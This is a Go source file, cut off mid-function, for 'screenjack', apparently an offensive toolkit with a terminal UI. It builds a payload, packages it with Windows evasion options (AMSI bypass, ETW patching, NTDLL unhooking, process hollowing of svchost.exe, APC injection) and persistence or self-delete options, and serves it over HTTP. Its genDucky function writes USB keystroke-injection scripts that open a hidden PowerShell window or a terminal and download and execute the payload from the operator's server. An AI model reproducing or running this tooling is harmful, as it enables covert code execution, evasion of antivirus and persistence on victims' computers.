package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/charmbracelet/bubbles/filepicker"
	"github.com/charmbracelet/bubbles/help"
	"github.com/charmbracelet/bubbles/key"
	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// Tab represents a main navigation tab
type Tab int

const (
	TabBuild Tab = iota
	TabDucky
	TabServer
	TabPackage
)

func (t Tab) String() string {
	return []string{"Build", "Ducky", "Server", "Package"}[t]
}

// PackageConfig holds RustRedOps packaging options
type PackageConfig struct {
	// Execution method (0=raw, 1+=RustRedOps methods)
	ExecMethod   int
	HollowTarget string

	// Evasion flags (bitfield-style, one per evasionMethods)
	Evasion []bool

	// Persistence
	PersistMethod int // 0=none, 1=registry, 2=xdg, 3=selfdel

	// Encryption
	Encrypt    bool
	EncryptKey string
}

var execMethods = []string{
	"Raw Binary",
	"Process Ghosting [Win]",
	"Process Hollowing [Win]",
	"Process Herpaderping [Win]",
	"APC Injection [Win]",
	"Thread Hijacking [Win]",
	"Threadless Injection [Win]",
	"Module Stomping [Win]",
}

var evasionMethods = []string{
	"AMSI Bypass [Win]",
	"ETW Patch [Win]",
	"NTDLL Unhook [Win]",
	"PPID Spoof [Win]",
	"Block DLL Policy [Win]",
	"Anti-Debug [Win]",
	"Anti-Analysis [Win]",
	"Direct Syscalls [Win]",
}

var persistMethods = []string{"None", "Registry Run [Win]", "XDG Autostart [Lin]", "Self-Delete [Win]"}

// KeyMap defines all keybindings
type KeyMap struct {
	Quit    key.Binding
	Help    key.Binding
	Tab     key.Binding
	Tab1    key.Binding
	Tab2    key.Binding
	Tab3    key.Binding
	Tab4    key.Binding
	Up      key.Binding
	Down    key.Binding
	Left    key.Binding
	Right   key.Binding
	Toggle  key.Binding
	Confirm key.Binding
	Server  key.Binding
	Assets  key.Binding
	Logs    key.Binding
	Back    key.Binding
	Build   key.Binding
	Cancel  key.Binding
}

func DefaultKeyMap() KeyMap {
	return KeyMap{
		Quit:    key.NewBinding(key.WithKeys("q", "ctrl+c"), key.WithHelp("q", "quit")),
		Help:    key.NewBinding(key.WithKeys("?"), key.WithHelp("?", "help")),
		Tab:     key.NewBinding(key.WithKeys("tab"), key.WithHelp("tab", "next tab")),
		Tab1:    key.NewBinding(key.WithKeys("1"), key.WithHelp("1", "Build")),
		Tab2:    key.NewBinding(key.WithKeys("2"), key.WithHelp("2", "Ducky")),
		Tab3:    key.NewBinding(key.WithKeys("3"), key.WithHelp("3", "Server")),
		Tab4:    key.NewBinding(key.WithKeys("4"), key.WithHelp("4", "Package")),
		Up:      key.NewBinding(key.WithKeys("k", "up"), key.WithHelp("k/↑", "up")),
		Down:    key.NewBinding(key.WithKeys("j", "down"), key.WithHelp("j/↓", "down")),
		Left:    key.NewBinding(key.WithKeys("left"), key.WithHelp("←", "left")),
		Right:   key.NewBinding(key.WithKeys("right"), key.WithHelp("→", "right")),
		Toggle:  key.NewBinding(key.WithKeys(" "), key.WithHelp("space", "toggle")),
		Confirm: key.NewBinding(key.WithKeys("enter"), key.WithHelp("enter", "confirm")),
		Server:  key.NewBinding(key.WithKeys("s"), key.WithHelp("s", "server")),
		Assets:  key.NewBinding(key.WithKeys("a"), key.WithHelp("a", "assets")),
		Logs:    key.NewBinding(key.WithKeys("l"), key.WithHelp("l", "logs")),
		Back:    key.NewBinding(key.WithKeys("esc"), key.WithHelp("esc", "back")),
		Build:   key.NewBinding(key.WithKeys("b"), key.WithHelp("b", "build")),
		Cancel:  key.NewBinding(key.WithKeys("c"), key.WithHelp("c", "cancel")),
	}
}

func (k KeyMap) ShortHelp() []key.Binding {
	return []key.Binding{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Build, k.Cancel, k.Server, k.Quit}
}

func (k KeyMap) FullHelp() [][]key.Binding {
	return [][]key.Binding{
		{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Tab},
		{k.Up, k.Down, k.Left, k.Right},
		{k.Toggle, k.Confirm, k.Build, k.Cancel},
		{k.Server, k.Assets, k.Logs, k.Quit},
	}
}

// Modal types
type Modal int

const (
	ModalNone Modal = iota
	ModalAssets
	ModalFilePicker
	ModalLogs
	ModalPreview
	ModalPackage
	ModalInput // generic text input modal
)

// Fixed viewport dimensions (in chars)
const (
	viewportW = 120 // main content width
	viewportH = 35  // main content height
	mainBoxW  = 75  // main content box width
	sidebarW  = 28  // sidebar width
	gap       = 1   // vertical gap between elements
)

// vstack joins elements vertically with consistent gap
func vstack(elements ...string) string {
	var filtered []string
	for _, e := range elements {
		if e != "" {
			filtered = append(filtered, e)
		}
	}
	return lipgloss.JoinVertical(lipgloss.Left, filtered...)
}

// hstack joins elements horizontally with gap
func hstack(elements ...string) string {
	return lipgloss.JoinHorizontal(lipgloss.Top, elements...)
}

// Styles
var (
	// Colors - amber/rust oxide palette
	colorRust     = lipgloss.Color("#D97706")
	colorAmber    = lipgloss.Color("#F59E0B")
	colorOrange   = lipgloss.Color("#EA580C")
	colorEmerald  = lipgloss.Color("#10B981")
	colorCyan     = lipgloss.Color("#06B6D4")
	colorRose     = lipgloss.Color("#F43F5E")
	colorStone50  = lipgloss.Color("#FAFAF9")
	colorStone400 = lipgloss.Color("#A8A29E")
	colorStone600 = lipgloss.Color("#57534E")
	colorStone800 = lipgloss.Color("#292524")

	styleTitle = lipgloss.NewStyle().
			Foreground(colorAmber).
			Bold(true)

	styleActiveTab = lipgloss.NewStyle().
			Foreground(colorStone800).
			Background(colorAmber).
			Bold(true).
			Padding(0, 2)

	styleInactiveTab = lipgloss.NewStyle().
				Foreground(colorStone400).
				Padding(0, 2)

	styleBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorStone600).
			Padding(1, 2)

	styleActiveBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorAmber).
			Padding(1, 2)

	styleLabel = lipgloss.NewStyle().
			Foreground(colorStone400).
			Width(12).
			Align(lipgloss.Right)

	styleValue = lipgloss.NewStyle().
			Foreground(colorStone50).
			PaddingLeft(1)

	styleFocusedValue = lipgloss.NewStyle().
				Foreground(colorAmber).
				Bold(true).
				PaddingLeft(1)

	styleStatus = lipgloss.NewStyle().
			Foreground(colorStone400).
			Padding(0, 1)

	styleSuccess = lipgloss.NewStyle().Foreground(colorEmerald)
	styleError   = lipgloss.NewStyle().Foreground(colorRose)
	styleWarn    = lipgloss.NewStyle().Foreground(colorOrange)

	styleModalOverlay = lipgloss.NewStyle().
				Border(lipgloss.DoubleBorder()).
				BorderForeground(colorAmber).
				Padding(1, 2)
)

// TargetItem implements list.Item for build targets
type TargetItem struct {
	Name     string
	Target   string
	Selected bool
}

func (t TargetItem) FilterValue() string { return t.Name }
func (t TargetItem) Title() string       { return t.Name }
func (t TargetItem) Description() string { return t.Target }

// AssetItem implements list.Item for assets
type AssetItem struct {
	Name     string
	Selected bool
}

func (a AssetItem) FilterValue() string { return a.Name }
func (a AssetItem) Title() string       { return a.Name }
func (a AssetItem) Description() string { return "" }

// TargetDelegate renders target items
type TargetDelegate struct{}

func (d TargetDelegate) Height() int                             { return 1 }
func (d TargetDelegate) Spacing() int                            { return 0 }
func (d TargetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d TargetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(TargetItem)
	if !ok {
		return
	}

	cursor := "  "
	if index == m.Index() {
		cursor = "> "
	}

	check := "[ ]"
	style := lipgloss.NewStyle()
	if item.Selected {
		check = "[x]"
		style = style.Foreground(colorCyan)
	}
	if index == m.Index() {
		style = style.Foreground(colorAmber).Bold(true)
		if item.Selected {
			style = style.Foreground(colorCyan).Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s %s", cursor, check, style.Render(item.Name))
}

// AssetDelegate renders asset items
type AssetDelegate struct{}

func (d AssetDelegate) Height() int                             { return 1 }
func (d AssetDelegate) Spacing() int                            { return 0 }
func (d AssetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d AssetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(AssetItem)
	if !ok {
		return
	}

	cursor := "  "
	style := lipgloss.NewStyle()
	if index == m.Index() {
		cursor = "> "
		style = style.Foreground(colorAmber).Bold(true)
	}
	if item.Selected {
		cursor = "✓ "
		style = style.Foreground(colorCyan)
		if index == m.Index() {
			style = style.Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s", cursor, style.Render(item.Name))
}

// TUIModel is the main model
type TUIModel struct {
	width, height int

	// Navigation
	activeTab Tab
	keys      KeyMap
	help      help.Model

	// Modal state
	modal Modal

	// Build tab
	targetList list.Model
	buildFocus int // 0=list, 1=build button
	buildMsg   string

	// Build system
	buildState    BuildState
	currentBuild  *BuildJob
	queuedBuild   *BuildJob // max 1 queued, newest wins
	buildProgress []TargetProgress
	buildLogs     []string // capped at 100 lines
	logExpanded   bool
	embedAsset    bool // true = embed, false = HTTP fetch
	buildCancel   context.CancelFunc

	// Assets
	assetList     list.Model
	selectedAsset string
	filePicker    filepicker.Model
	pathInput     textinput.Model // for typing paths directly
	pathInputMode bool            // true when typing path, false when browsing

	// Ducky tab
	duckyOS      string
	urlInput     textinput.Model
	payloadInput textinput.Model
	duckyFocus   int // 0=OS, 1=URL, 2=payload
	duckyMsg     string
	duckyLastGen string // timestamp of last generation

	// Server tab
	server   *Server
	serverIP string
	httpLogs []LogEntry

	// Package tab
	pkgConfig PackageConfig
	pkgFocus  int    // 0-7 for each field
	pkgMsg    string // build output

	// Input modal
	inputModal      textinput.Model
	inputModalTitle string
	inputModalCB    func(string) // callback when confirmed

	// Status
	status string
}

const logo = `  ____                            _            _
 / ___|  ___ _ __ ___  ___ _ __  (_) __ _  ___| | __
 \___ \ / __| '__/ _ \/ _ \ '_ \ | |/ _` + "`" + ` |/ __| |/ /
  ___) | (__| | |  __/  __/ | | || | (_| | (__|   <
 |____/ \___|_|  \___|\___|_| |_|/ |\__,_|\___|_|\_\
                               |__/                 `

func NewTUIModel() TUIModel {
	// Target list
	targets := []list.Item{
		TargetItem{Name: "linux-x86_64", Target: "x86_64-unknown-linux-gnu", Selected: false},
		TargetItem{Name: "windows-x86_64", Target: "x86_64-pc-windows-gnu", Selected: false},
	}
	targetList := list.New(targets, TargetDelegate{}, 40, 6)
	targetList.SetShowTitle(false)
	targetList.SetShowStatusBar(false)
	targetList.SetShowHelp(false)
	targetList.SetFilteringEnabled(false)

	// Asset list (empty initially)
	assetList := list.New([]list.Item{}, AssetDelegate{}, 40, 10)
	assetList.SetShowTitle(false)
	assetList.SetShowStatusBar(false)
	assetList.SetShowHelp(false)
	assetList.SetFilteringEnabled(true)
	assetList.Title = "Assets"

	// File picker
	fp := filepicker.New()
	fp.AllowedTypes = []string{".gif", ".png", ".jpg", ".jpeg"}
	fp.CurrentDirectory, _ = os.UserHomeDir()
	fp.ShowHidden = false
	fp.Height = 15

	// Text inputs for Ducky tab
	urlInput := textinput.New()
	urlInput.Placeholder = "http://localhost:8000"
	urlInput.SetValue("http://localhost:8000")
	urlInput.Width = 30

	payloadInput := textinput.New()
	payloadInput.Placeholder = "screenjack"
	payloadInput.SetValue("screenjack")
	payloadInput.Width = 20

	// Path input for adding assets
	pathInput := textinput.New()
	pathInput.Placeholder = "~/path/to/file.gif"
	pathInput.Width = 50
	pathInput.Prompt = "> "

	// Help
	h := help.New()
	h.ShowAll = false

	// Input modal
	inputModal := textinput.New()
	inputModal.Width = 40
	inputModal.Prompt = "> "

	return TUIModel{
		activeTab:     TabBuild,
		keys:          DefaultKeyMap(),
		help:          h,
		targetList:    targetList,
		assetList:     assetList,
		filePicker:    fp,
		pathInput:     pathInput,
		duckyOS:       "linux",
		urlInput:      urlInput,
		payloadInput:  payloadInput,
		server:        NewServer(),
		serverIP:      GetLocalIP(),
		inputModal:    inputModal,
		pkgConfig:     PackageConfig{HollowTarget: "svchost.exe", Evasion: make([]bool, len(evasionMethods))},
		status:        "Ready",
		buildState:    BuildIdle,
		buildProgress: []TargetProgress{},
		buildLogs:     []string{},
		embedAsset:    true,
	}
}

func (m TUIModel) Init() tea.Cmd {
	return tea.Batch(
		scanAssetsCmd(),
		m.filePicker.Init(),
	)
}

// scanAssetsCmd scans the assets directory
func scanAssetsCmd() tea.Cmd {
	return func() tea.Msg {
		var assets []string
		entries, _ := os.ReadDir("../assets")
		for _, e := range entries {
			if !e.IsDir() {
				name := e.Name()
				ext := strings.ToLower(filepath.Ext(name))
				if ext == ".gif" || ext == ".png" || ext == ".jpg" || ext == ".jpeg" {
					assets = append(assets, name)
				}
			}
		}
		return assetsScannedMsg{assets: assets}
	}
}

type assetsScannedMsg struct{ assets []string }
type fileSelectedMsg struct{ path string }

func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width, m.height = msg.Width, msg.Height
		m.help.Width = msg.Width
		m.targetList.SetSize(mainBoxW-4, 6)
		m.assetList.SetSize(mainBoxW-4, 12)
		m.filePicker.Height = 15
		return m, nil

	case assetsScannedMsg:
		items := make([]list.Item, len(msg.assets))
		for i, a := range msg.assets {
			items[i] = AssetItem{Name: a, Selected: a == m.selectedAsset}
		}
		m.assetList.SetItems(items)
		return m, nil

	case fileSelectedMsg:
		// Copy file to assets
		src := msg.path
		dst := "../assets/" + filepath.Base(src)
		if err := copyFile(src, dst); err != nil {
			m.status = styleError.Render("Error: " + err.Error())
		} else {
			m.status = styleSuccess.Render("Added " + filepath.Base(src))
			m.selectedAsset = filepath.Base(src)
		}
		m.modal = ModalNone
		return m, scanAssetsCmd()

	case buildDoneMsg:
		// ponytail: legacy handler, will be replaced by new build system
		m.buildLogs = strings.Split(msg.log, "\n")
		if msg.ok {
			m.buildMsg = styleSuccess.Render("✓ " + msg.msg)
			m.status = styleSuccess.Render("Build complete")
		} else {
			m.buildMsg = styleError.Render("✗ " + msg.msg)
			m.status = styleError.Render("Build failed")
		}
		return m, nil

	case packageDoneMsg:
		if msg.ok {
			m.pkgMsg = styleSuccess.Render("✓ " + msg.msg)
			m.status = styleSuccess.Render("Package complete")
		} else {
			m.pkgMsg = styleError.Render("✗ " + msg.msg)
			m.status = styleError.Render("Package failed")
		}
		return m, nil

	case tea.KeyMsg:
		// Modal handling
		if m.modal != ModalNone {
			return m.updateModal(msg)
		}

		// Global keys
		switch {
		case key.Matches(msg, m.keys.Quit):
			m.server.Stop()
			return m, tea.Quit

		case key.Matches(msg, m.keys.Help):
			m.help.ShowAll = !m.help.ShowAll
			return m, nil

		// Tab navigation: 1-4 or tab
		case key.Matches(msg, m.keys.Tab):
			m.activeTab = Tab((int(m.activeTab) + 1) % 4)
			return m, nil
		case key.Matches(msg, m.keys.Tab1):
			m.activeTab = TabBuild
			return m, nil
		case key.Matches(msg, m.keys.Tab2):
			m.activeTab = TabDucky
			return m, nil
		case key.Matches(msg, m.keys.Tab3):
			m.activeTab = TabServer
			return m, nil
		case key.Matches(msg, m.keys.Tab4):
			m.activeTab = TabPackage
			return m, nil

		// Global actions
		case key.Matches(msg, m.keys.Assets):
			m.modal = ModalAssets
			return m, nil

		case key.Matches(msg, m.keys.Server):
			return m, m.toggleServer()

		case key.Matches(msg, m.keys.Logs):
			if m.server.IsRunning() {
				m.modal = ModalLogs
			}
			return m, nil
		}

		// Tab-specific updates
		switch m.activeTab {
		case TabBuild:
			return m.updateBuildTab(msg)
		case TabDucky:
			return m.updateDuckyTab(msg)
		case TabServer:
			return m.updateServerTab(msg)
		case TabPackage:
			return m.updatePackageTab(msg)
		}
	}

	return m, tea.Batch(cmds...)
}

func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch m.modal {
	case ModalAssets:
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalNone
			return m, nil
		case msg.String() == "n":
			// Open file picker
			m.modal = ModalFilePicker
			return m, m.filePicker.Init()
		case key.Matches(msg, m.keys.Confirm):
			// Select current asset
			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
				m.selectedAsset = item.Name
				// Update list to show selection
				items := m.assetList.Items()
				for i, it := range items {
					if a, ok := it.(AssetItem); ok {
						a.Selected = a.Name == m.selectedAsset
						items[i] = a
					}
				}
				m.assetList.SetItems(items)
			}
			return m, nil
		default:
			var cmd tea.Cmd
			m.assetList, cmd = m.assetList.Update(msg)
			return m, cmd
		}

	case ModalFilePicker:
		// If path input is focused, handle typing
		if m.pathInputMode {
			switch msg.String() {
			case "esc":
				m.pathInputMode = false
				m.pathInput.Blur()
				return m, nil
			case "enter":
				// Try to add the file
				path := expandPath(m.pathInput.Value())
				if path != "" {
					m.pathInput.SetValue("")
					m.pathInput.Blur()
					m.pathInputMode = false
					return m, func() tea.Msg { return fileSelectedMsg{path: path} }
				}
				return m, nil
			case "tab":
				// Switch to browser mode
				m.pathInputMode = false
				m.pathInput.Blur()
				return m, nil
			default:
				var cmd tea.Cmd
				m.pathInput, cmd = m.pathInput.Update(msg)
				return m, cmd
			}
		}

		// Browser mode
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalAssets
			return m, nil
		case msg.String() == "/", msg.String() == ":":
			// Switch to path input mode
			m.pathInputMode = true
			m.pathInput.Focus()
			return m, textinput.Blink
		default:
			var cmd tea.Cmd
			m.filePicker, cmd = m.filePicker.Update(msg)

			// Check if file was selected
			if didSelect, path := m.filePicker.DidSelectFile(msg); didSelect {
				return m, func() tea.Msg { return fileSelectedMsg{path: path} }
			}
			return m, cmd
		}

	case ModalLogs:
		if key.Matches(msg, m.keys.Back) || msg.String() == "l" {
			m.modal = ModalNone
		}
		return m, nil

	case ModalInput:
		switch msg.String() {
		case "esc":
			m.modal = ModalNone
			m.inputModal.Blur()
			return m, nil
		case "enter":
			if m.inputModalCB != nil {
				m.inputModalCB(m.inputModal.Value())
			}
			m.modal = ModalNone
			m.inputModal.Blur()
			return m, nil
		default:
			var cmd tea.Cmd
			m.inputModal, cmd = m.inputModal.Update(msg)
			return m, cmd
		}
	}

	return m, nil
}

func (m TUIModel) updateBuildTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// buildFocus: 0=target list, 1=build button
	switch {
	case key.Matches(msg, m.keys.Down):
		if m.buildFocus == 0 {
			// Check if at bottom of list
			if m.targetList.Index() >= len(m.targetList.Items())-1 {
				m.buildFocus = 1
				return m, nil
			}
		}
		if m.buildFocus == 0 {
			var cmd tea.Cmd
			m.targetList, cmd = m.targetList.Update(msg)
			return m, cmd
		}
	case key.Matches(msg, m.keys.Up):
		if m.buildFocus == 1 {
			m.buildFocus = 0
			return m, nil
		}
		var cmd tea.Cmd
		m.targetList, cmd = m.targetList.Update(msg)
		return m, cmd
	case key.Matches(msg, m.keys.Toggle):
		if m.buildFocus == 0 {
			if item, ok := m.targetList.SelectedItem().(TargetItem); ok {
				item.Selected = !item.Selected
				items := m.targetList.Items()
				items[m.targetList.Index()] = item
				m.targetList.SetItems(items)
			}
		}
		return m, nil
	case key.Matches(msg, m.keys.Confirm):
		if m.buildFocus == 1 {
			return m, m.buildTargets()
		}
		// On list, toggle selection
		if item, ok := m.targetList.SelectedItem().(TargetItem); ok {
			item.Selected = !item.Selected
			items := m.targetList.Items()
			items[m.targetList.Index()] = item
			m.targetList.SetItems(items)
		}
		return m, nil
	}
	return m, nil
}

func (m TUIModel) updateDuckyTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// If a text input is focused, route to it
	if m.urlInput.Focused() || m.payloadInput.Focused() {
		switch msg.String() {
		case "esc", "enter":
			m.urlInput.Blur()
			m.payloadInput.Blur()
			return m, nil
		}
		var cmd tea.Cmd
		if m.urlInput.Focused() {
			m.urlInput, cmd = m.urlInput.Update(msg)
		} else {
			m.payloadInput, cmd = m.payloadInput.Update(msg)
		}
		return m, cmd
	}

	// duckyFocus: 0=OS, 1=URL, 2=payload, 3=generate button
	switch {
	case key.Matches(msg, m.keys.Up):
		m.duckyFocus = max(0, m.duckyFocus-1)
	case key.Matches(msg, m.keys.Down):
		m.duckyFocus = min(3, m.duckyFocus+1)
	case key.Matches(msg, m.keys.Toggle), key.Matches(msg, m.keys.Confirm):
		switch m.duckyFocus {
		case 0: // Toggle OS
			if m.duckyOS == "linux" {
				m.duckyOS = "windows"
			} else {
				m.duckyOS = "linux"
			}
		case 1: // Focus URL input
			m.urlInput.Focus()
			return m, textinput.Blink
		case 2: // Focus payload input
			m.payloadInput.Focus()
			return m, textinput.Blink
		case 3: // Generate button
			m.genDucky()
			m.status = styleSuccess.Render("Ducky script saved")
		}
	}
	return m, nil
}

func (m TUIModel) updateServerTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// Server tab specific keys if needed
	return m, nil
}

func (m TUIModel) updatePackageTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// Focus layout:
	// Left col:  0..execN-1 (exec), execN..execN+evasN-1 (evasion)
	// Right col: execN+evasN..+persistN-1 (persist), +persistN (encrypt), +persistN+1 (build)
	execN := len(execMethods)
	evasN := len(evasionMethods)
	persN := len(persistMethods)
	rightStart := execN + evasN
	rightEnd := rightStart + persN // encrypt
	buildIdx := rightEnd + 1
	maxFocus := buildIdx

	switch {
	case key.Matches(msg, m.keys.Up):
		if m.pkgFocus > 0 {
			m.pkgFocus--
		}
	case key.Matches(msg, m.keys.Down):
		if m.pkgFocus < maxFocus {
			m.pkgFocus++
		}
	case key.Matches(msg, m.keys.Left):
		// Right col → Left col
		if m.pkgFocus >= rightStart && m.pkgFocus < rightStart+persN {
			// persist → exec (map by relative position)
			relPos := m.pkgFocus - rightStart
			if relPos < execN {
				m.pkgFocus = relPos
			}
		} else if m.pkgFocus == rightEnd {
			// encrypt → first evasion
			m.pkgFocus = execN
		}
	case key.Matches(msg, m.keys.Right):
		// Left col → Right col
		if m.pkgFocus < execN {
			// exec → persist
			m.pkgFocus = rightStart + m.pkgFocus
			if m.pkgFocus >= rightStart+persN {
				m.pkgFocus = rightStart + persN - 1
			}
		} else if m.pkgFocus >= execN && m.pkgFocus < execN+evasN {
			// evasion → encrypt
			m.pkgFocus = rightEnd
		}
	case key.Matches(msg, m.keys.Toggle), key.Matches(msg, m.keys.Confirm):
		switch {
		case m.pkgFocus < execN:
			m.pkgConfig.ExecMethod = m.pkgFocus
			if m.pkgFocus == 2 { // hollow
				m.inputModalTitle = "Hollow Target Process"
				m.inputModal.Placeholder = "e.g. svchost.exe"
				m.inputModal.SetValue(m.pkgConfig.HollowTarget)
				m.inputModalCB = func(val string) { m.pkgConfig.HollowTarget = val }
				m.modal = ModalInput
				m.inputModal.Focus()
				return m, textinput.Blink
			}
		case m.pkgFocus >= execN && m.pkgFocus < execN+evasN:
			idx := m.pkgFocus - execN
			m.pkgConfig.Evasion[idx] = !m.pkgConfig.Evasion[idx]
		case m.pkgFocus >= rightStart && m.pkgFocus < rightStart+persN:
			m.pkgConfig.PersistMethod = m.pkgFocus - rightStart
		case m.pkgFocus == rightEnd:
			m.pkgConfig.Encrypt = !m.pkgConfig.Encrypt
		case m.pkgFocus == buildIdx:
			return m, m.buildPackage()
		}
	}
	return m, nil
}

type packageDoneMsg struct {
	ok  bool
	msg string
}

func (m *TUIModel) buildPackage() tea.Cmd {
	return func() tea.Msg {
		// Check if any evasion is enabled
		anyEvasion := false
		for _, e := range m.pkgConfig.Evasion {
			if e {
				anyEvasion = true
				break
			}
		}

		// Determine which payload(s) needed
		needsWindows := m.pkgConfig.ExecMethod > 0 || // Ghost/Hollow/etc are Windows-only
			anyEvasion || // All evasion methods are Windows
			m.pkgConfig.PersistMethod == 1 || m.pkgConfig.PersistMethod == 3 // Registry or Self-delete

		winPayload := "../payload/target/x86_64-pc-windows-gnu/release/screenjack.exe"
		linPayload := "../payload/target/x86_64-unknown-linux-gnu/release/screenjack"

		if needsWindows {
			if _, err := os.Stat(winPayload); os.IsNotExist(err) {
				return packageDoneMsg{false, "Build Windows payload first (tab 1)"}
			}
		}

		var cmds []string
		var info []string

		// Encryption (works on any payload)
		if m.pkgConfig.Encrypt {
			payload := winPayload
			if !needsWindows {
				if _, err := os.Stat(linPayload); err == nil {
					payload = linPayload
				} else if _, err := os.Stat(winPayload); err == nil {
					payload = winPayload
				} else {
					return packageDoneMsg{false, "Build a payload first (tab 1)"}
				}
			}
			cmds = append(cmds, fmt.Sprintf("just -f package.just encrypt %s", payload))
			info = append(info, "encrypted")
		}

		// Execution method (Windows only, indices match execMethods array)
		switch m.pkgConfig.ExecMethod {
		case 1: // Process Ghosting
			cmds = append(cmds, fmt.Sprintf("just -f package.just ghost %s", winPayload))
			info = append(info, "ghost")
		case 2: // Process Hollowing
			cmds = append(cmds, fmt.Sprintf("just -f package.just hollow %s %s", winPayload, m.pkgConfig.HollowTarget))
			info = append(info, "hollow")
		case 3: // Process Herpaderping
			info = append(info, "herpaderp (TODO)")
		case 4: // APC Injection
			cmds = append(cmds, fmt.Sprintf("just -f package.just inject %s", winPayload))
			info = append(info, "apc")
		case 5: // Thread Hijacking
			info = append(info, "thread-hijack (TODO)")
		case 6: // Threadless Injection
			info = append(info, "threadless (TODO)")
		case 7: // Module Stomping
			info = append(info, "module-stomp (TODO)")
		}

		// Self-delete (Windows)
		if m.pkgConfig.PersistMethod == 3 {
			cmds = append(cmds, fmt.Sprintf("just -f package.just selfdel %s", winPayload))
			info = append(info, "selfdel")
		}

		// XDG/Registry persistence is handled by payload --persist flag, not here
		if m.pkgConfig.PersistMethod == 1 || m.pkgConfig.PersistMethod == 2 {
			info = append(info, "use --persist flag on payload")
		}

		if len(cmds) == 0 {
			if len(info) > 0 {
				return packageDoneMsg{true, strings.Join(info, ", ")}
			}
			return packageDoneMsg{true, "Raw binary - no packaging needed"}
		}

		// Run commands
		for _, cmdStr := range cmds {
			cmd := exec.Command("bash", "-c", cmdStr)
			cmd.Dir = ".."
			output, err := cmd.CombinedOutput()
			if err != nil {
				// Log error for debugging
				os.WriteFile("/tmp/screenjack-pkg.log", output, 0644)
				return packageDoneMsg{false, fmt.Sprintf("Failed: %s (see /tmp/screenjack-pkg.log)", cmdStr)}
			}
		}

		return packageDoneMsg{true, fmt.Sprintf("Built %d module(s)", len(cmds))}
	}
}

type buildDoneMsg struct {
	ok  bool
	msg string
	log string
}

func (m *TUIModel) buildTargets() tea.Cmd {
	return func() tea.Msg {
		var logs strings.Builder
		var out []string
		ok := true

		items := m.targetList.Items()
		for _, it := range items {
			t, isTarget := it.(TargetItem)
			if !isTarget || !t.Selected {
				continue
			}

			logs.WriteString(fmt.Sprintf("=== %s ===\n", t.Target))
			cmd := exec.Command("cargo", "build", "--release", "--target", t.Target)
			cmd.Dir = "../payload"
			output, err := cmd.CombinedOutput()
			logs.Write(output)
			logs.WriteString("\n")

			if err != nil {
				ok = false
				out = append(out, t.Name+":FAIL")
			} else {
				out = append(out, t.Name+":OK")
			}
		}

		if len(out) == 0 {
			return buildDoneMsg{false, "nothing selected", ""}
		}

		os.WriteFile("/tmp/screenjack-build.log", []byte(logs.String()), 0644)
		return buildDoneMsg{ok, strings.Join(out, " "), logs.String()}
	}
}

func (m *TUIModel) toggleServer() tea.Cmd {
	if m.server.IsRunning() {
		m.server.Stop()
		m.status = "Server stopped"
	} else {
		payloadPath, ok := PayloadExists(m.duckyOS)
		if !ok {
			m.status = styleError.Render("No payload built")
			return nil
		}
		assetPath := ""
		if m.selectedAsset != "" {
			assetPath = "../assets/" + m.selectedAsset
		}
		if err := m.server.Start(payloadPath, assetPath); err != nil {
			m.status = styleError.Render(err.Error())
		} else {
			m.status = styleSuccess.Render(fmt.Sprintf("Server running on :%d", m.server.Port()))
		}
	}
	return nil
}

func (m *TUIModel) genDucky() {
	var b strings.Builder

	baseURL := m.urlInput.Value()
	payloadName := m.payloadInput.Value()
	if m.server.IsRunning() {
		baseURL = fmt.Sprintf("http://%s:%d", m.serverIP, m.server.Port())
	}
	url := strings.TrimSuffix(baseURL, "/") + "/" + payloadName

	b.WriteString(fmt.Sprintf("REM screenjack payload - target: %s\n", m.duckyOS))
	b.WriteString(fmt.Sprintf("REM url: %s\n", url))
	b.WriteString("REM exit: Ctrl+Shift+Escape (hold 2s)\n")
	b.WriteString("DELAY 500\n\n")

	if m.duckyOS == "windows" {
		b.WriteString("REM Open hidden PowerShell\n")
		b.WriteString("GUI r\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING powershell -w hidden\n")
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download and execute\n")
		b.WriteString(fmt.Sprintf("STRING $u='%s';$p=\"$env:TEMP\\%s.exe\";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p\n",
			url, payloadName))
		b.WriteString("ENTER\n")
	} else {
		b.WriteString("REM Open terminal\n")
		b.WriteString("CTRL-ALT t\n")
		b.WriteString("DELAY 500\n\n")
		b.WriteString("REM Download, chmod, execute in background\n")
		b.WriteString(fmt.Sprintf("STRING curl -sO %s && chmod +x %s && ./%s &\n", url, payloadName, payloadName))
		b.WriteString("ENTER\n")
		b.WriteString("DELAY 300\n")
		b.WriteString("STRING exit\n")
		b.WriteString("ENTER\n")
	}

	os.MkdirAll("../ducky", 0755)
	os.WriteFile("../ducky/payload_"+m.duckyOS+".txt", []byte(b.String()), 0644)
	m.duckyLastGen = time.Now().Format("15:04:05")
}

func (m TUIModel) View() string {
	if m.width < 80 || m.height < 24 {
